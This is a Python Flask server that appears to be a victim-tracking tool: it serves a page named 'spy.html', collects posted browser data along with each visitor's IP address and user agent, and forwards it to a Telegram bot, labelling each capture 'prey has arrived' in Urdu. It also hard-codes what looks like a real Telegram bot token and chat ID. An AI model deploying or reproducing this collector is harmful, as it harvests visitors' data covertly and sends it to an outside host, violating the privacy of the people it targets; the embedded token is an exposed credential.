from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

# ====== Telegram Configuration ======
BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"  # ← یہاں اپنا اصل چیٹ آئی ڈی لگاؤ

# ====== HTML Route ======
@app.route('/')
def index():
    return render_template("spy.html")

# ====== Data Receiver Route ======
@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    message = f"""
👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device: {user_agent}
🧠 Raw Data: {data}
    """

    # Telegram پر بھیجو
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    requests.post(url, data=payload)

    return "OK", 200

# ====== Start App on Render ======
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
